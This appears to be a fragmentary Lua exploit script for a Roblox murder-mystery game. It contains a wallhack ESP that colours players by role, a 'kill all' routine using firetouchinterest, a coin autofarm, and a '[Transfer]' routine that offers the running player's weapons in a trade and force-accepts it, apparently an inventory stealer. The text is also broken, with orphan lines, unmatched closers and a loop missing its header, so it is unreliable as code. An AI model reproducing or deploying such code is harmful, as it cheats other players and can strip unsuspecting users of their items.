local function gfi()
    local list = {}
    pcall(function()
        local pd = require(RPS.Modules.ProfileData)
        if pd and pd.Weapons and pd.Weapons.Owned then
            for n, a in pairs(pd.Weapons.Owned) do
                if a and a > 0 then
                    table.insert(list, n.." x"..tostring(a))
                end
            end
        end
    end)
    table.sort(list)
    return list
end

    return n and tostring(n):lower() == TU:lower()

local function gwps()
    local list = {}
    pcall(function()
        local pd = require(RPS.Modules.ProfileData)
        if pd and pd.Weapons and pd.Weapons.Owned then
            for n, a in pairs(pd.Weapons.Owned) do
                if a and a > 0 and not (n == "DefaultKnife") and not (n == "DefaultGun") then
                    local cnt = math.min(a, 4)
                    for i = 1, cnt do
                        table.insert(list, n)
                    end
                end
            end
        end
    end)
    return list
end

local function fa()
    if not AT then return end
    print("[Transfer] Force accepting...")
    for i = 1, 15 do
        if LF then
            pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
        end
        pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
        pcall(function() AT:FireServer() end)
        task.wait(0.35)
    end
end

local function ow()
    if not OI or not TR or OT >= 4 then return end
    if tick() - LO < 0.55 then return end
    local wps = gwps()
    if #wps == 0 then return end
    local to = math.min(4 - OT, #wps)
    for i = 1, to do
        local ok = pcall(function()
            OI:FireServer(wps[i], "Weapons")
        end)
        if ok then
            OT = OT + 1
            LO = tick()
            print("[Transfer] Offered:", wps[i], "("..OT.."/4)")
            task.wait(0.3)
        end
    end
    if OT >= 4 and not AS then
        AS = true
        print("[Transfer] Full -> wait 7s")
        task.delay(7, function()
            if TR then fa() end
        end)
    end
end

local function hk()
    local ch = lp.Character
    local bp = lp.Backpack
    if ch then
        local t = ch:FindFirstChildOfClass("Tool")
        if t and t.Name:lower():find("knife") then return true end
    end
    for _, it in ipairs(bp:GetChildren()) do
        if it:IsA("Tool") and it.Name:lower():find("knife") then return true end
    end
    return false
end

local function ke()
    local ch = lp.Character
    if not ch then return end
    local kn = ch:FindFirstChildOfClass("Tool") or ch:FindFirstChild("Knife")
    if not kn then
        for _, it in ipairs(lp.Backpack:GetChildren()) do
            if it:IsA("Tool") and it.Name:lower():find("knife") then
                kn = it
                kn.Parent = ch
                break
            end
        end
    end
    if not kn or not kn:FindFirstChild("Handle") then return end
    print("[AF] Kill all...")
    for _, pl in ipairs(P:GetPlayers()) do
        if not (pl == lp) and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                firetouchinterest(pl.Character.HumanoidRootPart, kn.Handle, 1)
                firetouchinterest(pl.Character.HumanoidRootPart, kn.Handle, 0)
            end)
        end
    end
end

local function epm()
    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    LG.GlobalShadows = false
    LG.FogEnd = 9e9
    LG.Brightness = 2
    pcall(function()
        LG.EnvironmentDiffuseScale = 0
        LG.EnvironmentSpecularScale = 0
    end)
    PM = true
end

local function getRole(pl)
    local ok, roles = pcall(function()
        local r = RPS:FindFirstChild("GetPlayerData", true)
        if r then return r:InvokeServer() end
        return nil
    end)
    if ok and roles and roles[pl.Name] then
        return roles[pl.Name].Role or "Innocent"
    end
    local ch = pl.Character
    if ch then
        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then
            return "Murderer"
        end
        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then
            return "Sheriff"
        end
    end
    return "Innocent"
end

local function updESP()
    if not ES then
        for _, h in pairs(HL) do
            if h and h.Parent then h:Destroy() end
        end
        HL = {}
        return
    end
    for _, pl in ipairs(P:GetPlayers()) do
        if not (pl == lp) and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            local role = getRole(pl)
            local col = Color3.fromRGB(0, 170, 255)
            if role == "Murderer" then
                col = Color3.fromRGB(255, 40, 40)
            elseif role == "Sheriff" or role == "Hero" then
                col = Color3.fromRGB(40, 255, 80)
            end
            local h = HL[pl]
            if not h or not h.Parent then
                h = Instance.new("Highlight")
                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                h.FillTransparency = 0.45
                h.OutlineTransparency = 0.2
                h.Parent = pl.Character
                HL[pl] = h
            end
            h.FillColor = col
            h.OutlineColor = col
            h.Adornee = pl.Character
        end
    end
end

task.spawn(function()
    while true do
        task.wait(0.6)
        updESP()
    end
end)

        if AF then

            local root = ch and ch:FindFirstChild("HumanoidRootPart")
            if root then

                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name == "Coin_Server" and not VS[obj] then
                        local d = (obj.Position - root.Position).Magnitude
                        if d < dist and d < RG then
                            closest, dist = obj, d
                        end
                    end
                end
                if closest then
                    local tw = TS:Create(root, TweenInfo.new(dist / SP, Enum.EasingStyle.Linear), {CFrame = CFrame.new(closest.Position)})
                    tw:Play()
                    tw.Completed:Wait()
                    if closest and closest.Parent then
                        VS[closest] = true
                        CL = CL + 1
                        LT = tick()
                        IS = false
                    end
                end
            end
            task.wait(0.08)
        else
            task.wait(0.5)
        end
    end
end)

    end
end)
